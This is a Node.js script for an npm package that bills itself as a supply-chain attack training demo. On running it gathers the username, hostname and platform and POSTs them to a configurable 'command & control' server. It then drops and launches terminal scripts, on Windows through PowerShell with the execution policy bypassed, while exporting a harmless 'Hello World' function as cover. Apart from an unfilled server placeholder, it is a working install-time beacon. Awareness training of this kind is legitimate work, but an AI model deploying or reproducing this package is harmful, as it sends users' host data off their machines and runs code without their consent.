const os = require('os');
const { exec } = require('child_process');
const http = require('http');

// ⚠️ CHANGE THIS TO YOUR TRACKER IP!
const TRACKING_SERVER = TRACKING SERVER IP!;
const DEMO_END_DATE = new Date('2026-12-31'); //CHANGE TO DESIRED END DATE

const ASCII_ART = `
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗                          ║
║   ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗                         ║
║   ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║                         ║
║   ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║                         ║
║   ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝                         ║
║   ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝                          ║
║                                                                          ║
║   🚨 YOUR SYSTEM HAS BEEN COMPROMISED 🚨                                ║
║                                                                          ║
║   This is a SUPPLY CHAIN ATTACK demonstration.                          ║
║                                                                          ║
║   What just happened:                                                   ║
║   ✓ A malicious npm package was installed                              ║
║   ✓ Code executed during 'npm install'                                 ║
║   ✓ System information was collected                                   ║
║   ✓ Data was sent to a remote server                                   ║
║                                                                          ║
║   In a real attack, this could have stolen:                             ║
║   • Your environment variables & secrets                               ║
║   • Your source code                                                   ║
║   • Your AWS/API keys                                                  ║
║   • Your entire CI/CD pipeline                                         ║
║                                                                          ║
║   Check the dashboard at: ${TRACKING_SERVER}              ║
║                                                                          ║
║   This is a training exercise. No real harm was done.                   ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
`;

function checkDemoExpired() {
  if (new Date() > DEMO_END_DATE) {
    console.log('Demo period expired. Package deactivated.');
    process.exit(0);
  }
}

function collectSystemInfo() {
  return {
    username: os.userInfo().username,
    hostname: os.hostname(),
    platform: os.platform(),
    nodeVersion: process.version,
    packageVersion: require('./package.json').version,
  };
}

function sendInfectionReport(data) {
  const url = new URL(TRACKING_SERVER + '/api/infect');
  const postData = JSON.stringify(data);

  const options = {
    hostname: url.hostname,
    port: url.port || 80,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    },
    timeout: 5000
  };

  const req = http.request(options, (res) => {
    let body = '';
    res.on('data', (chunk) => body += chunk);
    res.on('end', () => {
      if (res.statusCode === 200) {
        console.log('✓ Infection reported to command & control server');
      }
    });
  });

  req.on('error', (error) => {
    console.error('Warning: Could not connect to tracking server:', error.message);
  });

  req.on('timeout', () => {
    req.destroy();
    console.error('Warning: Connection to tracking server timed out');
  });

  req.write(postData);
  req.end();
}

function openTerminalWithAscii() {
  const platform = os.platform();
  const fs = require('fs');
  const path = require('path');
  
  if (platform === 'win32') {
    const scriptContent = `
      [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
      chcp 65001 | Out-Null
      Write-Host "${ASCII_ART.replace(/\n/g, '`n')}" -ForegroundColor Red
      Write-Host ""
      Write-Host "Press any key to close..." -ForegroundColor Yellow
      $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    `;
    const scriptPath = path.join(os.tmpdir(), 'pwned.ps1');
    fs.writeFileSync(scriptPath, scriptContent, 'utf8');
    exec(`start powershell -NoExit -ExecutionPolicy Bypass -File "${scriptPath}"`, (error) => {
      if (error) console.error('Could not open terminal:', error.message);
    });
  } else if (platform === 'darwin') {
    const scriptContent = `#!/bin/bash
echo "${ASCII_ART.replace(/"/g, '\\"')}"
echo ""
echo "Press any key to close..."
read -n 1 -s
`;
    const scriptPath = path.join(os.tmpdir(), 'pwned.sh');
    fs.writeFileSync(scriptPath, scriptContent);
    fs.chmodSync(scriptPath, '755');
    exec(`open -a Terminal "${scriptPath}"`, (error) => {
      if (error) console.error('Could not open terminal:', error.message);
    });
  } else {
    const scriptContent = `#!/bin/bash
echo "${ASCII_ART.replace(/"/g, '\\"')}"
echo ""
echo "Press any key to close..."
read -n 1 -s
`;
    const scriptPath = path.join(os.tmpdir(), 'pwned.sh');
    fs.writeFileSync(scriptPath, scriptContent);
    fs.chmodSync(scriptPath, '755');
    const terminals = ['gnome-terminal', 'xterm', 'konsole', 'xfce4-terminal'];
    for (const term of terminals) {
      exec(`which ${term}`, (error) => {
        if (!error) {
          exec(`${term} -e "${scriptPath}"`, (error) => {
            if (error) console.error('Could not open terminal:', error.message);
          });
          return;
        }
      });
    }
  }
}

function main() {
  console.log('\n🚨 MALICIOUS PACKAGE ACTIVATED 🚨\n');
  checkDemoExpired();
  const systemInfo = collectSystemInfo();
  console.log('Collecting system information...');
  console.log('Reporting to command & control server...');
  sendInfectionReport(systemInfo);
  setTimeout(() => {
    console.log('Opening terminal...');
    openTerminalWithAscii();
    console.log(ASCII_ART);
  }, 1000);
}

main();

module.exports = {
  greet: () => 'Hello World',
  version: require('./package.json').version
};
